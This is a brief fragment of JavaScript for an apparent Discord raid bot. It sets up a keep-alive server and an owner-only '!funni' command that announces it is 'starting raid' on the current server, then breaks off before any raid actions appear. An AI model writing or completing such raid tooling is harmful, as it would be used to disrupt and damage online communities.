...
require('http').createServer((req, res) => res.end('Ready.')).listen(4000);

client.on('messageCreate', async (message, ownerID) => {

if ( message.author.id != ownerID ) return;
if ( !message.content.toLowerCase().startsWith('!funni') ) return;
  
 message.author.send("**[START]** Starting raid on " + `**${message.guild.name}**`);
